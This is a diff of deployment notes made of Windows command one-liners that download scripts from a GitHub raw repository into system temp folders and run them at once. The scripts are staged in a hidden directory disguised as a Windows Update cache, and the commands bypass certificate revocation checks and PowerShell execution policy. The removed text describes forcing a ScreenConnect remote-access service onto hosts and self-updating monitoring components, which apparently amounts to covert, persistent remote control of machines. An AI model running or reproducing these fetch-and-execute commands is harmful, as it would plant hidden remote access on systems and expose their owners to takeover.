@@ -1,19 +1,7 @@
-UNIVERSAL DEPLOY (O49 / M35 / L29 — guaranteed update: deploy ALWAYS pulls latest core files from repo, stages in C:\Windows\Temp so ACL locks cannot block; mon tick unhardens workdir + stages updates in Temp every tick):
+UNIVERSAL DEPLOY (sevrz-only — Gryxa stack removed from project):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o49" & findstr /C:"OWN BUILD 20260802O49" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o54" & findstr /C:"OWN BUILD 20260804O54" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-STUCK HOSTS (won't self-update) — unharden then deploy:
-icacls "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" /reset /T /C /Q >nul 2>&1 & attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" 2>nul & attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o49" & findstr /C:"OWN BUILD 20260802O49" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+FORCE UPDATE mon/lib (ticking hosts also self-update from main every tick):
 
-O49/M35 guarantee:
-- Deploy (own.txt) no longer ships stale embedded payloads — it ALWAYS downloads latest own_lib/own_mon/own_secure/tg_report from the repo (embed = offline fallback only).
-- All downloads staged in C:\Windows\Temp\.upd (never ACL-locked), then moved into .wucache — LockDir cannot freeze the update channel.
-- Every mon tick unhardens the workdir + re-grants SYSTEM/Admin before attempting self-update.
-Net: any host that runs a tick OR a deploy converges to the latest build, whatever its prior state.
-
-GRYXA-ONLY FORCE FIX (L34 — use when mon is alive but gryxa is stuck: service missing, 1603/ProductCode-collision, phantom Installer registration, or inflight=1 loop). Pulls L34 lib from cache-busted raw, clears stale wrapper, forces ensure:
-attrib -h -s -r "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" 2>nul & curl.exe -L --ssl-no-revoke -o "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?nocache=%RANDOM%%RANDOM%" & findstr /C:"OWN_LIB  BUILD 20260802L34" "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" & del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\gryxa_install.cmd" 2>nul & powershell -NoProfile -ExecutionPolicy Bypass -File "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache" -Build FORCEPUSH
-
-Then wait ~60s and verify:  sc query "ScreenConnect Client (36e506ff016b2151)"   → want STATE RUNNING.
-
-L34 note: the 1603 was a cross-FP ProductCode collision (old 9908198e + new 36e506ff share ProductCode {9D7CC418-...}); /i hit maintenance mode and failed. Worse, some hosts have a PHANTOM Installer registration (Installed=00:00:00, no ARP key) that msiexec /x cannot remove. L33 /x's the ProductCode; L34 additionally purges the packed-GUID keys under HKCR/UserData Installer Products so /i is a true first-time INSTALL. Any host that pulls L34 auto-fixes on its next gryxa-ensure tick — no manual cleanup needed.
+curl.exe -L --ssl-no-revoke -o %TEMP%\fz.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/freeze_now.cmd && %TEMP%\fz.cmd
